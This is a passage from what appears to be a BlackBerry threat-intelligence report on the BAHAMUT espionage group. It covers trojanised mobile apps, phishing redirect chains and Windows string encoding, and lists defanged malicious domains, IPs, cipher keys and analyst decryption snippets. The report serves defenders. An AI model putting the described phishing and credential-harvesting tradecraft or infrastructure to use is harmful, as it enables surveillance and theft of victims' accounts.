an\nupdate), and a video player (more than 1000 installs there too). Aside from the Ramadan-themed\napplication, the rest would ostensibly appeal to anyone and could therefore have served any number\nof targeting requirements. Of course, in the Emirates, the Ramadan application could have seen\nwider usage as well.\n\nIn addition to applications available in the Play Store, BAHAMUT utilized several of their own\nwebsites to distribute malicious Android applications. BlackBerry identified seven recent campaigns\nwhich distributed the applications via the following links. All of them shared the same unique\nnetwork fingerprint:\n\n- http://nonsurfvpn[.]com/non_surf_vpn.apk\n\n- http://toysforislam[.]com/download/askaritoysforislam.apk\n\n- https://khalistanlehar[.]com/singhsoorme.apk\n\n- http://www.alqalamweekly[.]com/apk/alqalam.apk\n\n- http://sikhforjustice[.]org/download/sfj.apk\n\n- http://jamaat-ul-islam[.]com/KashmirAlliance/Kashmir-Youth.apk\n\n- https://procompass[.]org/download/compasspro.apk\n\nIncluded among these seven were a few all-purpose applications that would appeal to general\naudiences, like the VPN and compass applications. But what caught BlackBerry’s attention here\nwere the other five. Khalistan and Sikh applications invoked the Sikh separatist movement which, as\nexplained elsewhere in this report, had drawn the ire of both the Punjabi and national government.\nAskari Toys for Islam, whose Twitter page announced that an application would soon be available\nfor iOS (Attn: Apple Inc.), described itself as an application for firearms enthusiasts:\n\n_Figure 19: Twitter account of ToysForIslam[.]com as of July 2020_\n\n\n-----\n\nThe Al Qalam Weekly application was presumably designed to emulate a Peshawar-based Urdu\nnewspaper of the same name, which had come under recent scrutiny by pundits in the Indian press\nas being a “mouthpiece” for a Pakistani-based, Islamist militant group active in Kashmir called Jaishe-Mohammad. On February 14, 2019, this group claimed responsibility for attacks in Kashmir that\nresulted in the deaths of 40 Indian paramilitary police, setting off weeks of armed conflict between\nthe Pakistani and Indian militaries in the region.\n\nJamaat-ul-Islami is another Islamist group with offshoots in Pakistan, India, and Kashmir that\nappears to advocate for separatism and self-determination in the disputed Kashmir region.\nThroughout 2019 and 2020, tensions in Kashmir only grew, drawing the attention not just of the\nstates with direct regional interests (i.e. Pakistan, India, and China) but also the wider international\ncommunity. The repeated armed clashes in Kashmir more recently caused the Indian government\nto accuse journalists of spreading “fake news” and to restrict the use of VPNs, social media\napplications, and the Internet throughout Kashmir (Mohammad, 2020).\n\n###### Flying Under the Radar\n\nA variety of modifications were made to the APKs we found, and most had limited to no detection\nin a commonly used malware repository. In most cases the APK files were comprised of completely\nlegitimate code and well-known Android libraries which helped cloak the underlying activity from\ncommon static detection methods.\n\nNearly all of the identified samples from the Play Store employed AES in CBC mode for encrypting\ntheir network traffic with the C2 server. A couple of the applications additionally used an AES cipher\nin ECB mode for string encryption. If network callback strings were not directly AES encrypted within\nthe code, they were simply stored in hex, encoded, within the application itself, or as a hex-encoded\nstring inside of the resource section. The Android “resources.arsc” file can be readily processed by\nexisting tools, “androguard” and “apktool” (available at https://github.com/androguard/androguard\nand https://github.com/iBotPeaches/Apktool), into an XML document that is much easier to analyze.\nWe also observed that BAHAMUT individually constructed every network callback within all the\napplications by appending the final destination location onto one or more base URLs.\n\nSimilarly, for five of the seven externally hosted applications, BAHAMUT used the default Java\nBlowfish encryption cipher to encrypt strings. By default, this would utilize Blowfish in ECB mode\nwith PKCS5 padding. BlackBerry observed three different keys employed by the group: “K&M9B#)\nO/R\\\\=P@hB”, “K&M9B#)O/R\\x07=P%hA”, and “9;_R%@c`gZxL9M{j”. These allowed us to assess\nwith high confidence that we were on the right track given the similarities across disparate samples.\nIt also appeared that these externally hosted applications were capable of loading additional\nfunctionality via DEX files if directed to by the C2 server.\n\n\n-----\n\n**from** **Crypto.Cipher** **import Blowfish**\n**import** **base64,binascii**\n\nBS = 16\npad = **lambda s: s + (BS -** len(s) % BS) * chr(BS - len(s) % BS)\nunpad = **lambda s : s[0:-ord(s[-1])]**\n\n**def** decrypt(s):\ns = base64.b64decode(binascii.unhexlify(s))\nkey = b'K&M9B#)O/R\\\\=P@hB'\nblow = Blowfish.new(key,Blowfish.MODE_ECB)\ndecrypted = blow.decrypt(s)\n**return unpad(decrypted.decode('utf-8'))**\n\n\n_Figure 20: Python snippet to decrypt Blowfish encrypted strings_\n\n###### Backdoor Capabilities\n\nThe exact functionality of the backdoors fluctuated across samples but all of them included a\nmodule to enumerate filetypes of interest on the devices. The specific filetypes enumerated across\nsamples also varied widely. However, the following extensions were typically included: “.txt”, “.pdf”,\n“.docx”, “.doc”, “.mp4”, “.xls”, “.xlsx”, “.3gp”, “.csv”, “.jpg”, “.jpeg”, and “.png”. All of the backdoors\npossessed the ability to upload a file to a remote server. This effectively allowed the group to\nremotely identify and upload any potential file of interest on the compromised devices. Functionality\nto enumerate device information, access contacts, access call records, access SMS messages,\nrecord phone calls, record audio, record video, download and update the backdoor, and track GPS\nlocation were also observed amongst the samples. Further details are included in the Appendix.\n\n###### Operation ROCK — iOS\n\nDespite numerous bites at the apple, security researchers at various private companies, writing\nabout BAHAMUT or groups they suspected might be related to BAHAMUT, have so far not uncovered\nany evidence of iOS-based backdoors delivered via the App Store. This is true despite historical\ncredential phishing URLs which suggested the group had been focused on Apple[®] products and\nservices for quite some time.\n\nUltimately, iOS malware (available outside the App Store) which BlackBerry attributes to the group\nwas written about in July of 2018 in a two-part blog post by researchers at Cisco Talos (Talos)\n(Mercer, Rascagneres, & Williams, Advanced Mobile Malware Campaign in India uses Malicious\nMDM, 2018) (Mercer, Rascagneres, & Williams, Advanced Mobile Malware Campaign in India uses\nMalicious MDM — Part 2, 2018). In the campaign, an unnamed threat group deployed an opensource mobile device management (MDM) system to compromise iOS devices. Talos speculated\nthat infection of the victims involved either physical access to the devices or some form of social\nengineering. About a month later, custom MacOS malware developed by BAHAMUT was revealed by\nTaha Karim, then at DarkMatter. He termed the group responsible for its development WINDSHIFT\n(Karim, 2018). Subsequent technical analyses of the aforementioned samples did not appear until\nthe end of 2018 (Wardle 2018) and again in early 2019 (McCabe 2019)\n\n\n-----\n\nGiven all of these underlying facts, BlackBerry went searching under the assumption that additional\niOS applications must exist given both the prevalence and longevity of the Android malware\nand campaigns. BlackBerry located several of them, thanks to a critical operational misstep by\nBAHAMUT. We are referring here to a unique network service fingerprint.\n\nBlackBerry successfully uncovered a total of nine malicious iOS applications that we assess were\nrecently created by BAHAMUT. All of the applications were available in the App Store as of August\n2020 at the following URLs:\n\n[• https://apps.apple[.]com/ae/app/mib-messaging-in-bucket/id1444388921?ls=1](https://apps.apple[.]com/ae/app/mib-messaging-in-bucket/id1444388921?ls=1)\n\n[• https://apps.apple[.]com/ae/app/doctor-health/id1450134674?ls=1](https://apps.apple[.]com/ae/app/doctor-health/id1450134674?ls=1)\n\n[• https://apps.apple[.]com/ne/app/fittrack-stay-fit-active/id1451916725?ls=1](https://apps.apple[.]com/ne/app/fittrack-stay-fit-active/id1451916725?ls=1)\n\n[• https://apps.apple[.]com/gb/app/athan-times-ramadan-2019/id1456575117?ls=1](https://apps.apple[.]com/gb/app/athan-times-ramadan-2019/id1456575117?ls=1)\n\n[• https://apps.apple[.]com/ae/app/smart-file/id1469522820?ls=1](https://apps.apple[.]com/ae/app/smart-file/id1469522820?ls=1)\n\n[• https://apps.apple[.]com/ae/app/password-saver-secure-forever/id1490388515?ls=1](https://apps.apple[.]com/ae/app/password-saver-secure-forever/id1490388515?ls=1)\n\n[• https://apps.apple[.]com/ae/app/smart-pager-free-voip-calling/id1484055491](https://apps.apple[.]com/ae/app/smart-pager-free-voip-calling/id1484055491)\n\n[• https://apps.apple[.]com/ae/app/spam-master/id1492559598?ls=1](https://apps.apple[.]com/ae/app/spam-master/id1492559598?ls=1)\n\n[• https://apps.apple[.]com/ae/app/islamic-emoji-maker/id1483734164?ls=1](https://apps.apple[.]com/ae/app/islamic-emoji-maker/id1483734164?ls=1)\n\n\n-----\n\n_Figure 21: Screenshots of malicious iOS applications in the App Store as of August 2020_\n\nAs was the case with BAHAMUT’s Android applications available in the Play Store, the iOS App\nStore applications hit all the same generic themes with universal appeal. Messaging and VOIP\napplications were used to entice users in the Emirates, a place where the messaging functionality\nof popular applications like Skype[®] and WhatsApp has been severely restricted or banned entirely.\nThe prayer application would have had wider appeal for citizens of predominantly Muslim countries\nas well. Of course, the intended purpose of the file management and password saver applications\nwas concerning in and of itself, given that the applications were delivering that information to sites\nunder BAHAMUT’s control. Notably, we failed to identify any applications that contained political\novertones or selectively targeted special interest groups.\n\n\n-----\n\nIn much the same vein as the Android malware, the iOS samples had well-designed legitimate\ncover sites which included terms of service, privacy pages, contact information, and reflected a\nclose attention to detail that so-called advanced threat groups often overlook. An example of one\nof these cover websites was demonstrated below:\n\n_Figure 22: iOS cover site for the Spam Master application_\n\nSo why did the iOS samples go undiscovered for so long given that the Android samples were known\nto exist for nearly five years? Apple’s maintenance of an extremely closed software and application\necosystem has created considerable hurdles for researchers and tinkerers in the identification and\nanalysis of all applications, not just malware. Recently, Apple released a new version of iOS that\nhas led to the flagging of several “legitimate” applications for doing things in the background that\nusers might not approve of (Clover, 2020).\n\n\n-----\n\n###### Technical Breakdown of “Password Saver.ipa”\n\nBlackBerry examined one of BAHAMUT’s iOS applications a little more closely: Password\nSaver. The application itself was relatively straightforward and resided within the root\nof the IPA package with the filename “passwordmanager”. BlackBerry analyzed the file,\n“bca642c1cbf4e0bf742c57f50bbd6ef0e45dda860bc5c595668dcec7b6adf6af,” in depth to gain\na better understanding of its functionality. From a casual first glance, there wasn’t anything to\nimmediately indicate any malicious functionality. Sensitive strings within the binary were stored,\nencrypted, using the AES cipher in CBC mode with a 256-bit key.\n\nHowever, upon closer inspection of the functions responsible for encryption and decryption,\nsome interesting oddities became apparent. Specifically, there was a function called\n“GenerateRandomIV16” which in lieu of creating a random initialization vector actually just returned\nthe string “KAn/T4hDmMB2Hf0z”. Note here that the IV generated wasn’t random. BAHAMUT just\nused that term to describe and name the function. All of the decryption functions resided within two\nclasses: one that was randomly named, “xxxv0xtu”, and another called “util”. The final encryption\nand decryption were performed using Apple’s CommonCryptor library (Apple, 2007). The majority of\nthe other code in the binary was composed of other standard libraries. The applications employed\na custom method called “keyurl” to derive the actual AES key used during the decryption process\nfrom the MD5 hash of the string “%vuy#8qpYBS*#673BNWO(28POj”.\n\n\n**from** **Crypto.Cipher** **import AES**\n**import** **base64**\n```\nBS = 16\n\n```\n`pad =` **lambda s: s + (BS -** `len(s) % BS) *` `chr(BS -` `len(s) % BS)`\n`unpad =` **lambda s : s[0:-ord(s[-1])]**\n\n**def** `decrypt(s):`\n```\n     s = base64.b64decode(s)\n     iv = b'KAn/T4hDmMB2Hf0z'\n     key = b'75b20f6006f7384f4b9c81ced9e14068'\n     aes = AES.new(key, AES.MODE_CBC,iv)\n     decrypted = aes.decrypt(s)[16:]\n\n```\n**return unpad(decrypted.decode('utf-8'))**\n\n\n_Figure 23: Python snippet to decode encrypted strings in “passwordmanager”_\n\nIt turned out that the program did in fact “function” as advertised and stored usernames and\npasswords encrypted. However, it did so in a way that was also easily reversible. As advertised, the\napplication would automatically populate stored credentials for the following websites including,\nnotably, BlackBerry:\n\n\n-----\n\nmail.yandex.com www.ebay.com www.instagram.com\n\nwww.amazon.com www.facebook.com www.linkedin.com\n\nwww.bing.com www.gmail.com www.mail.com\n\nwww.blackberry.com www.google.com www.microsoft.com\n\nwww.dropbox.com www.icloud.com www.netflix.com\n\nwww.pinterest.com www.tumblr.com www.youtube.com\n\nwww.protonmail.com www.yahoo.com\n\nwww.reddit.com www.yelp.in\n\nThe application would also sync that same credential data with the remote server “passwordsaverr[.]\ncom” which was under the control of BAHAMUT, as evidenced by its unique network service\nfingerprint. What better way to phish unsuspecting victims than to have them willingly provide all\ntheir usernames and passwords in accordance with the terms of services. BAHAMUT even warned\nits targets in “ALLCAPS” on their cover site:\n\n“WE ARE NOT LIABLE TO YOU OR ANY OTHER PERSON FOR ANY INCIDENTAL,\n\nCONSEQUENTIAL, SPECIAL, INDIRECT, PUNITIVE OR EXEMPLARY DAMAGES, INCLUDING,\n\nWITHOUT LIMITATION, EQUIPMENT DOWNTIME, LOSS OF DATA, OR LOST PROFITS,\n\nBY INSTALLING OR USING THE CONTENT, YOU ACCEPT SOLE RESPONSIBILITY FOR\n\nALL CONSEQUENCES ARISING THEREFROM AND ACKNOWLEDGES THAT NO CLAIM\n\nWHATSOEVER WILL BE MADE AGAINST US OR OUR LICENSORS, DISTRIBUTORS, AGENTS,\n\nEMPLOYEES OR AFFILIATES”\n\nSimilarly, the application’s privacy policy left a few things to be desired:\n\n“When you use our application the App takes information regarding the user’s Device to\n\nensure compatibility of your device with our application. This application shall have access\n\nto collect all your passwords, documents etc. and other files which are stored in your\n\nlocal storage.”\n\nBy downloading and using this particular password manager, victims would have effectively granted\nBAHAMUT unrestricted access to all of their files and passwords.\n\nThe other applications were equally suspect and encrypted any sensitive strings in the binary,\nincluding network callback information and any information that could have tipped off Apple as to\nthe applications’ true intent.\n\n\n-----\n\nIt should be noted that in the App Store links above, the majority of the applications were available\nin the United Arab Emirates, while one could be linked to the Niger App Store and another to the\nUnited Kingdom App Store. All of the applications did what they promised – and quite a bit more\nfor unsuspecting victims. For example, all the applications we examined encrypted pieces of data\nusing AES and a 256-bit key. They also communicated various bits of data to remote servers. The\nkeys for decryption were static and, in some cases, hidden within the application’s icon file. The\napplications processed the image data to derive a key, one that did not change between different\ninstallations of the application or invocations of the encryption algorithm. This method of encryption\ndeviates from the norm, and is characteristic of an application that is trying to hide from analysis,\nsince this form of encryption offers no practical security benefits to the data. These applications\nwould be limited only to the data the user authorized BAHAMUT to access whether wittingly or\nsurreptitiously.\n\nAfter further reviewing each application, BlackBerry was able to identify the original store where\neach application was first published, as follows:\n\n**Athan Times: https://apps.apple[.]com/ca/app/athan-times-ramadan-2020/id1456575117**\n\n - First released in Canada\n - Access to location information and calendar information\n\n**[Doctor Health: https://apps.apple[.]com/in/app/doctor-health/id1450134674](https://apps.apple[.]com/in/app/doctor-health/id1450134674)**\n\n - First released in India\n - Access to location information and health data\n\n**Islamic Emoji Maker: https://apps.apple[.]com/tt/app/islamic-emoji-maker/id1483734164**\n\n - First released in Trinidad and Tobago\n - Access to keyboard input\n\n**MIB: https://apps.apple[.]com/sa/app/mib-messaging-in-bucket/id1444388921**\n\n - First released in Saudi Arabia\n - Access to all accounts entered into the application and communication made through the app:\n\n  - Skype\n  - WhatsApp\n  - Telegram\n  - Facebook Messenger\n\n**Password Saver: https://apps.apple[.]com/tt/app/password-saver-secure-forever/**\nid1490388515?ign-mpt=uo%3D2\n\n - First released in Trinidad and Tobago\n - Access to passwords saved within the application and all files on the device\n\n**Smart File: https://apps.apple[.]com/cr/app/smart-file/id1469522820?l=en**\n\n - First released in Costa Rica\n - Access to all files stored on the iPhone\n\n**Smart Pager:** https://apps.apple[.]com/tt/app/smart-pager-free-voip-calling/\nid1484055491?ign-mpt=uo%3D2\n\n - First released in Trinidad and Tobago\n - Access to communications handled by the application and contact information\n\n\n-----\n\n**Spam Master: https://apps.apple[.]com/gh/app/spam-master/id1492559598**\n\n - First released in Ghana\n - Access to text messages and phone calls\n\n\n-----\n\n## The Art of Phishing\n\n\n-----\n\n### Tradecraft: The Art of Phishing\n\nBlackBerry assesses that BAHAMUT’s phishing and credential harvesting tradecraft is significantly\nbetter than the majority of other publicly known APT groups. This is principally due to the group’s\nspeed, their dedication to single-use and highly compartmentalized infrastructure, and their ability\nto adapt and change, particularly when their phishing tools are exposed.\n\nBAHAMUT’s original framework for phishing, as defined by researchers writing for Bellingcat,\nhas today evolved into an even more well-honed credential harvesting system aimed at very\nprecise targets.\n\nWhile monitoring BAHAMUT’s operations over the past year, BlackBerry watched new phishing\ninfrastructure spring up weekly. Just as other researchers previously observed, many of these highly\ntargeted spear-phishing operations lasted anywhere from a few hours to a few months, depending\non the domain and success rates. This embrace of ever-fleeting infrastructure makes real-time\ndetection all but impossible. Catching a window that is open only for a few hours on infrastructure\nthat is constantly changing requires resources and luck that few network defenders, much less\nindividual targets, could ever hope to possess.\n\nAlso key to BAHAMUT’s ever-increasing skillset is their ability to learn from their mistakes. Upon\nclose analysis of the operational timeline of their various domains and subdomains, it is clear that\nBAHAMUT very carefully monitors any research published about them by the information security\ncommunity. This is true in some respect for all threat actors, but few respond with such alacrity.\nAfter any large-scale public disclosure about the group (and there were many, though under a\nconfusing array of different monikers), BAHAMUT would shut down any related infrastructure almost\nimmediately. The group also appears to have scrutinized how researchers previously linked their\ncampaigns together and adapted accordingly.\n\nFor example, beginning in late 2017, after Bellingcat revealed how they enumerated the group’s\nprevious targets, BAHAMUT drastically altered how they phished their targets en masse. They\nbegan to employ a particular piece of JavaScript, “slowAES”, which allowed them to pass encrypted\nparameters within the URL requests in a series of redirects from the starting phishing URL. The end\nresult was the identification of the targeted individuals became increasingly less straightforward.\n\nLuckily, when BAHAMUT employed that specific piece of code, BlackBerry discerned that it could\nbe turned against them to identify even more of their phishing infrastructure. It then became trivial\nto deduce the entity or organization that was the ultimate target, despite the use of AES encryption.\nWhat’s more, if BAHAMUT’s first attempts were unsuccessful, they would try again with an additional\npiece of personal information such as a telephone number to trick the target into believing the source\nwas legitimate. This helped BlackBerry confirm the identities of several of the targets.\n\nThroughout our analysis of their phishing behavior, BlackBerry observed that BAHAMUT was\ngenerally in possession of a great deal of information about their targets prior to phishing them.\nThis was clearly the result of a concerted and robust reconnaissance operation. BlackBerry strongly\nsuspects that much of the data came as a direct result of the group’s extensive deployment of\n“fakes.” Remember, the term “fakes” here should be taken to mean any attacker-controlled websites\ndesigned to imitate another website, any attacker owned social media profiles, or any attackercontrolled website designed to disseminate information (e.g. Techsprouts).\n\n\n-----\n\nFor example, BlackBerry observed BAHAMUT-controlled, fake social media profiles are used to\nbuild credibility with journalists as well as to engage with targets, directing them to assets that\nshare the same network fingerprint. BlackBerry also identified nearly a dozen “empty” websites that\nborrowed the majority of their code from elsewhere on the internet and did not appear to be used\nfor anything at the time of discovery.\n\nInterestingly, BlackBerry noticed that several of BAHAMUT’s targets submitted phishing URLs they\nreceived via email or social media to various online sandboxing platforms like URL Scan “https://\nulrscan.io”, ANY.RUN, “https://app.any.run”, and Hybrid-Analysis “https://hybrid-analysis.com”. These\nsecurity providers preserved them, and they are available to the public. Some examples of recent\nand historic phishing attempts were still available at the following URLs:\n\n- https://urlscan[.]io/result/633ee58e-0129-4617-9b6f-cd68f6b75e6d\n\n- https://app.any[.]run/tasks/64bb320a-4b60-4200-8af3-c878e64b1b7c/\n\n- https://www.hybrid-analysis[.]com/sample/ceed464a87bdc07c55d88b2385a2715847831039\n28887e15dcbd1236c2048b89?environmentId=120\n\nReaders will notice that URL Scan makes it significantly easier to follow and track the individual\nrequests. URL Scan also conveniently includes responses returned for requests made over\nSSL and TLS.\n\nToday, BAHAMUT typically uses a free URL shortening service such as, “grabify.link”, “1hr.hu”,\n“t.co”, “u.nu”, “tinyurl.com”, “bit.do”, or in some cases stands up their own site, such as “ghelp.co”, to\nperform an initial redirect. It is these very services that provide the attacker with granular information\nabout when victims actually click on the links, information that typically includes IP address, local\ntime, and User-Agent of the browser used. This information can be quickly analyzed to determine\nwhether or not the intended target had clicked on a lure, and in some cases we observed that new\nURLs were re-sent to the same targets in an attempt to follow up.\n\nThe second redirection is usually to a Freenom-hosted domain (https://www.freenom.com/) as\npreviously documented in the WINDSHIFT research (Karim, 2018). Following this redirection is\nyet another redirection to an attacker-hosted and controlled domain. These domains are designed\nto precisely mimic a legitimate page and BlackBerry saw them used to collect credentials before\nforwarding the target on to either the original website requested, or else to another landing page. In\nsome cases, tertiary and quaternary domains are part of the redirection process, all of which would\nappear to happen instantaneously to the targets unless they were closely watching the address bar\non a phone or corner of their browser window on a computer. In other words, instead of a single redirect from the link clicked on by the target, there are typically four or more re-directs, all designed\nto complicate analysis by researchers and victims.\n\nBlackBerry observed phishing attempts designed to mimic various government agency logins, as\nwell as private email and other account portals including Microsoft Live, Gmail[™], Yahoo!, Apple ID,\nTwitter, Facebook, Telegram, Microsoft OneDrive, 163, Sina, ProtonMail – just about every free email\nand messaging service one could imagine. What was particularly interesting was that the group\nappeared to frequently know the target’s personal email address and generally avoided phishing\nattempts against corporate or government addresses directly.\n\n\n-----\n\nAn example of this behavior is displayed in the “ANY.RUN” link above. The target was a government\nofficial working for the United Arab Emirates. As discussed above in the Targeting section, the\ngovernments of Bahrain, Saudi Arabia, and United Arab Emirates are regular and recurring interests\nof the BAHAMUT group. Older URLs BlackBerry identified suggested BAHAMUT’s palette also\nincluded various African governments, East Asian governments, as well as officials in Turkey,\nKuwait, Qatar, and Pakistan.\n\nWhile most of BAHAMUT’s tradecraft was exceptional, they slipped in a few critical areas, allowing\nBlackBerry to discover a wide range of cross-platform activity. BlackBerry found one such example\nin the use of the anonymous URL shortening service TinyURL (https://tinyurl.com). In addition to\nleveraging the service to transform their phishing links into something a bit more benign, they also\nused the service to perform redirection from the base of their phishing sites. Taha Karim, author of\nthe WINDSHIFT research, which BlackBerry associates with BAHAMUT, first disclosed the group’s\npreference of this particular redirection service in 2018 (Karim, 2018). Making a request to the IP\naddress of one of these phishing sites on port 443 would trigger a redirection to another, benign\nwebsite. This was presumably done to avoid suspicion. If the victim browsed to the base domain of\none of phishing domains it would redirect to a legitimate error message from services like Apple or\nGoogle. BlackBerry quickly realized that scanning services like Shodan (https://shodan.io) could be\nleveraged to reliably detect this behavior. Around fifteen active phishing domains were enumerated\nthis way using the following request:\n\nhttps://www.shodan.io/search?query=Location%3A+https%3A%2F%2Ftinyurl.\n\ncom+port%3A%22443%22\n\n\n-----\n\nWhile the above request generated a handful of false positives, those outliers were minimal enough\nto verify by hand. At the time of authorship, the following BAHAMUT phishing IP addresses and\ndomains were live:\n\n**IP Address** **Phishing Domain** **TinyURL Redirect** **Final Destination**\n\n164.160.131[.]174 mailinfo-bh[.]com https://tinyurl[.]com/vslwa8k https://pivni.info/mapa.php\n\n176.103.57[.]2 secure-useraccount[.]com https://tinyurl[.]com/rgcwqt8 http://www.casauthentication.com\n\n176.103.63[.]195 accountvalidate[.]com https://tinyurl[.]com/wqwllwa https://www.validate-network.org/\n\n178.150.0[.]196 onlinetokenid[.]com https://tinyurl[.]com/yxsy63or https://www.google.com/error\n\n178.150.0[.]247 cloud-authorize[.]com https://tinyurl[.]com/yywkh5dy https://www.apple.com/error\n\n193.203.50[.]179 privacylog[.]info https://tinyurl[.]com/s9wfyyo http://www.privacylog.net/\n\n195.123.212[.]82 out-look-mail-bh[.]com https://tinyurl[.]com/wb96v4p https://outlookamusements.com/\n\n31.28.171[.]133 mail-incc[.]com https://tinyurl[.]com/yxpcvb28 https://addressnmail.com/\n\n45.10.88[.]11 login-private[.]com https://tinyurl[.]com/yywkh5dy https://www.apple.com/error\n\n45.128.148[.]27 user-privacy[.]com https://tinyurl[.]com/qo86jyq https://www.websitepolicies.com/\n\n51.75.156[.]163 setting-secure[.]com https://tinyurl[.]com/yxsy63or https://www.google.com/error\n\n51.77.90[.]253 sync-tokens[.]com https://tinyurl[.]com/yywkh5dy https://www.apple.com/error\n\n80.79.122[.]113 mail-validation[.]info https://tinyurl[.]com/s6pr9qt https://validation.com/\n\n85.254.144[.]31 logon-info-gsupport[.]com - https://tinyurl[.]com/yxsy63or https://www.google.com/error\n\n176.103.62[.]151 assurecom[.]info https://tinyurl[.]com/y74o5buf https://www.monsiteassure.fr/\n\n_Table 2: BAHAMUT-controlled IP addresses redirecting to shortened TINYURLs_\n\nThis type of redirect may be useful for achieving the aim of not immediately tipping off a target.\nHowever, BlackBerry was able to effectively leverage the same technique against the group to\nenumerate other similarly styled phishing infrastructure and domains. The following phishing\ndomains below all redirected using similar techniques. BlackBerry enumerated additional domains\nusing the following Shodan queries:\n\nShodan Query: https://www.shodan.io/search?query=Location%3A+http%3A%2F%2Fweb.archive.\ncom%2F+port%3A443\n\n\n-----\n\n_Table 3: Phishing domains identified from a common redirect to “web.archive.com”_\n\nShodan Query:\n\nhttps://www.shodan.io/search?query=Location%3A+https%3A%2F%2Fsafenet.\n\nauthentication-as-a-service.com%2F+port%3A443\n\n**IP Address** **Phishing Domain**\n\n185.244.150[.]102 imging[.]site\n\n87.120.37[.]253 portal549[.]com\n\n87.120.37[.]66 ghelp[.]co\n\n91.92.109[.]95 o-auth[.]net\n\n94.156.77[.]136 myggl[.]io\n\n_Table 4: Phishing domains identified from a common redirect to “safenet.authentication-as-a-service.com”_\n\nGiven BAHAMUT’s propensity for changing tack midstream, BlackBerry expects the aforementioned\ndomains and IP addresses to go down in short order following this publication.\n\n\n-----\n\n###### Operational Security++\n\nBlackBerry previously noted that BAHAMUT does an exceptional job of segregating their phishing,\ncredential harvesting, Android, iOS, and Windows infrastructure from one another.\n\nIn a departure from BAHAMUT tactics described in prior research by others, BlackBerry today\nobserves that there is no domain or IP address cross-over between operational functions in the\ngroup’s current tradecraft. We find, for example, that no domains or IP addresses used to control\nor distribute Windows malware are used for phishing or to administer malware designed for any\nother operating system. Similarly, it is rare that any single server is used for more than a single\nmobile application at any given time. BAHAMUT ensures that no hosting provider is leveraged\ntoo heavily and spreads its current active infrastructure across more than 50 different hosting\nproviders, thereby ensuring operational continuity if any single campaign is identified or a set of\nmalware samples is disclosed. This is likely enormously time consuming, expensive, and requires\nconsiderable attention to detail.\n\nAs researchers, we must weigh the cost-benefit of releasing information given the impact it will\nhave on both defenders and attackers. Given the benefit of better historical visibility, BlackBerry can\nassert that prior research on BAHAMUT had little to no effect on the overall operational capabilities\nof the group. The group either quickly built new infrastructure or shifted their operations to other\nexisting servers. This suggests that the group is either extremely well-funded or had stockpiled\nenough resources to weather any potential storm.\n\nBAHAMUT is meticulous with their domain registrations, ensuring different privacy services are used,\ndomains are purchased from a variety of different registrars and resellers, and the group limits the\nnumber of domains that could be associated with any single email address. Some of the first public\nresearch on the group was released by Kaspersky (Legezo, 2016), which did not attribute the activity\nthey discovered to any threat actor. In retrospect, it appears that a common email address, “david.\nryall[at]mail.ru”, was present within a large number of the domains’ Start of Authority (aka SOA, or\nresponsible party) records. This email could have been used to link several disparate Windows-based\nC2 domains to one another. BlackBerry only recently noticed this. However, BAHAMUT spotted it\nimmediately following that publication, and going forward the group safeguarded against linking\nmore than a few domains to any single email address. Similarly, after Bellingcat noted the group's\npreference for “mail.ru” email addresses, BAHAMUT immediately shifted to the free provider “pobox.\nsk”, which Bellingcat subsequently noted in their follow-up post. At present, the group prefers to\nuse the providers “mail-king.com”, “posta.ro”, and “all.bg”.\n\nIn sum, BlackBerry finds BAHAMUT to be well above average in its social engineering. The group\nhas truly impressive operational security that enables them to continue to attack despite numerous,\nrepeated attempts to expose their operations.\n\n\n-----\n\n-----\n\n### Tradecraft: Windows Jedi Math Tricks\n\nWhile a good portion of the BAHAMUT tradecraft is focused on drawing targets into position for\ncredential harvesting, the group is known to deploy malware for Android, iOS, MacOS, and Windows.\nIn prior research, including research conducted by Cylance (acquired by BlackBerry in 2019), it has\nbeen noted that the Windows malware employed by the group is typically open-source, but heavily\nobfuscated. In other research, we’ve seen discussion of BAHAMUT malware that was previously\nassociated with various other APT groups. The use of malware in this way reflects the group’s\ndedication to operational security and evasion of attribution by security researchers. If analysts\nrely solely on the signatures of publicly available malware and open-source exploits, the hand of\nthe operator can remain hidden among an impossibly long list of suspects.\n\nIn this section, BlackBerry explores some of the intricacies of BAHAMUT’s current (or recent)\nWindows malware. While only a few representative samples are explored in detail in this paper, the\nanalysis reflects an understanding built upon the review of several hundred more.\n\nMany of the recent BAHAMUT Windows samples BlackBerry identified use an interesting string\nencoding method that takes advantage of floating-point calculations. These calculations are\nperformed on the x87 math co-processor and require a deeper understanding of what exactly\nthose eight extra memory registers do. BlackBerry had not observed floating-point calculations\nused in decoding/decryption functions in malware frequently in the past. In order to proceed with\nthe analysis of these samples, BlackBerry reimplemented the function into an easy to understand\nPython3 prototype below:\n\n```\nimport binascii\nimport math\ndef is_prime(a_val):\n  math_point = int(math.sqrt(a_val))\n  for cnt in range(math_point, 1, -1):\n     if math.fmod(a_val,cnt) == 0.0:\n       return False\n  return True\ndef decode(in_str):\n  byte_str = binascii.unhexlify(in_str).decode('utf-8')\n  ret_list = []\n  for cnt, a_byte in enumerate(byte_str):\n    val = ord(a_byte)\n    val_2 = (val - 3) if (cnt & 1) != 0 else (val + 5)\n     if is_prime(cnt+1):\n      ret_list.append(chr(val-1))\n     else:\n      ret_list.append(chr(val_2))\n  return(''.join(ret_list))\n\n```\n\n_Figure 24: Python snippet to decode strings in recent BAHAMUT downloaders_\n\n\n-----\n\nHaving a grasp now of this unique encoding method, BlackBerry then searched for and identified\nthe following recent Windows-related domains and IP addresses. BlackBerry was able to uncover\nWindows samples which communicated with or were downloaded from the following domains\nand IP addresses:\n\n**Indicator Type** **Indicator** **First Active** **Last Active**\n\nIP 91.219.238[.]246 4/18/2018 \nIP 81.177.3[.]119 11/20/2018 \nDomain lobertica[.]info 1/16/2020 \nDomain hypforever[.]com 1/3/2020 \nDomain tierradom[.]com 12/26/2019 \nDomain treemanic[.]com 12/19/2019 \nDomain optusiy[.]com 12/12/2019 \nDomain trioganic[.]com 10/10/2019 2/7/20\n\nDomain cocahut[.]com 8/19/2019 2/17/20\n\nDomain opticzstore[.]com 7/26/2019 11/5/19\n\nDomain medieczema[.]com 7/1/2019 2/21/20\n\nDomain musicbandfiles[.]com 2/28/2019 \nDomain poiusavid[.]com 1/18/2019 9/30/19\n\nDomain trailhinder[.]com 1/7/2019 10/14/19\n\nDomain cyroonline[.]com 11/21/2018 2/16/20\n\nDomain opticscold[.]com 11/17/2018 8/19/19\n\nDomain signtabo[.]com 10/30/2018 \nDomain zhqdgk[.]com 10/23/2018 2/17/20\n\nDomain regditogo[.]com 9/22/2018 1/11/20\n\nDomain weddnest[.]com 9/19/2018 3/8/20\n\n_Table 5: Recent BAHAMUT Windows-based 